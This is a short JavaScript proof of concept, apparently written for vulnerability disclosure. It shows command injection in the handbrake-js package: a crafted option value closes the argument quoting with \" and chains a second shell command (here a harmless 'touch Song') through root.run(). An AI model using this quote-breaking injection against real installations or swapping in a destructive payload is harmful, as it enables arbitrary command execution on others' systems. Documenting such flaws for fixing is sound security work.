/**
 * The injection point locats at line 79,
 * though the program uses "quote" to warp the args,
 * we can use \" to close the quote and inject the code
 */
var root = require("handbrake-js");
var attack_code = "touch Song";
var opt = {
  "test": "\"&" + attack_code + "&\"" 
}
root.run(opt);
